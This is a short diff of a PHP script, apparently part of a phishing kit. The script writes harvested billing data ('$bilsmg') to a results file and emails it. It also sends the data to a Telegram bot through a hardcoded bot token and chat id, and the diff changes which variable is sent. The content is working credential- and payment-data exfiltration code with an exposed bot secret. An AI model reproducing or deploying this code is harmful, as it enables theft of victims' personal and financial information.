@@ -28,13 +28,12 @@ mail($bilsnd,$bilsub,$bilsmg,$bilhead);
 
 
 $Txt_Rezlt = fopen('rzlt.txt', 'a+');
-fwrite($Txt_Rezlt, $message);
+fwrite($Txt_Rezlt, $bilsmg);
 fclose($Txt_Rezlt);
 
-mail($to, $subject, $message, $headers);
 $token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";
 
-file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($message)."" );
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-791509674&text=" . urlencode($bilsmg)."" );
 
 
 
